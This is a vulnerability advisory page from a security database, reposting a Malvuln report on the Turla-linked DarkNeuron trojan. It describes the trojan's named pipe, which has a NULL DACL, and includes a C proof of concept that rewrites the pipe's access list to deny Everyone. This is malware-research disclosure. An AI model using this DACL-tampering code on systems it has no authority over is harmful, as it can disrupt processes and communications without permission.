---
title: Trojan.Win32.DarkNeuron.gen / Named Pipe Null DACL
url: https://cxsecurity.com/issue/WLB-2022110042
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-27
fetch_date: 2025-10-03T23:52:37.463126
---

# Trojan.Win32.DarkNeuron.gen / Named Pipe Null DACL

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Trojan.Win32.DarkNeuron.gen / Named Pipe Null DACL** **2022.11.26**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [malvuln](https://cxsecurity.com/author/malvuln/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source: https://malvuln.com/advisory/d891c9374ccb2a4cae2274170e8644d8.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln
Backup media: infosec.exchange/@malvuln
Threat: Trojan.Win32.DarkNeuron.gen
Vulnerability: Named Pipe Null DACL
Family: DarkNeuron (Turla Group)
Type: PE32
MD5: d891c9374ccb2a4cae2274170e8644d8
Vuln ID: MVID-2022-0661
Disclosure: 11/24/2022
Description: The malware process "NCSC.exe" creates an IPC pipe with a NULL DACL allowing RW for the Everyone user group.
\\.\Pipe\Winsock2\baseapi\_http
RW Everyone
RW BUILTIN\Administrators
Local low privileged users can modify the DACL to remove rights for the Everyone users group, denying access to use the pipe for further RW interprocess communications.
Exploit/PoC:
#include "windows.h"
#include "stdio.h"
#include "accctrl.h"
#include "aclapi.h"
/\*
Trojan.Win32.DarkNeuron.gen (Turla Group) NCSC.exe
MD5: d891c9374ccb2a4cae2274170e8644d8
NamedPipe Exploit Deny Access to Everyone
By Malvuln
Nov of 2022
\*\*/
#define VULN\_TROJAN\_PIPE "\\\\.\\pipe\\Winsock2\\baseapi\_http"
int main(void){
HANDLE hPipe = CreateFileA((LPCSTR)VULN\_TROJAN\_PIPE, GENERIC\_WRITE | WRITE\_DAC, 0, NULL, OPEN\_EXISTING, NULL, NULL);
PACL pOldDACL = NULL;
PACL pNewDACL = NULL;
if (hPipe == INVALID\_HANDLE\_VALUE){
printf("%d", GetLastError());
return 1;
}
if(GetSecurityInfo(hPipe, SE\_KERNEL\_OBJECT, DACL\_SECURITY\_INFORMATION, NULL, NULL, &pOldDACL, NULL, NULL) != ERROR\_SUCCESS){
printf("%d", GetLastError());
return 1;
}
TRUSTEE trustee[1];
trustee[0].TrusteeForm = TRUSTEE\_IS\_NAME;
trustee[0].TrusteeType = TRUSTEE\_IS\_GROUP;
trustee[0].ptstrName = TEXT("Everyone");
trustee[0].MultipleTrusteeOperation = NO\_MULTIPLE\_TRUSTEE;
trustee[0].pMultipleTrustee = NULL;
EXPLICIT\_ACCESS explicit\_access\_list[1];
ZeroMemory(&explicit\_access\_list[0], sizeof(EXPLICIT\_ACCESS));
explicit\_access\_list[0].grfAccessMode = DENY\_ACCESS;
explicit\_access\_list[0].grfAccessPermissions = GENERIC\_ALL;
explicit\_access\_list[0].grfInheritance = NO\_INHERITANCE;
explicit\_access\_list[0].Trustee = trustee[0];
if(SetEntriesInAcl(1, explicit\_access\_list, pOldDACL, &pNewDACL) != ERROR\_SUCCESS){
printf("%d", GetLastError());
return 1;
}
if(SetSecurityInfo(hPipe, SE\_KERNEL\_OBJECT, DACL\_SECURITY\_INFORMATION, NULL, NULL, pNewDACL, NULL) != ERROR\_SUCCESS){
printf("%d", GetLastError());
return 1;
}else{
printf("Trojan.Win32.DarkNeuron.gen (Turla Group) PWNED!\n");
printf("By Malvuln\n");
printf("Nov of 2022\n");
}
LocalFree(pNewDACL);
LocalFree(pOldDACL);
CloseHandle(hPipe);
system("pause");
return 0;
}
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110042)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top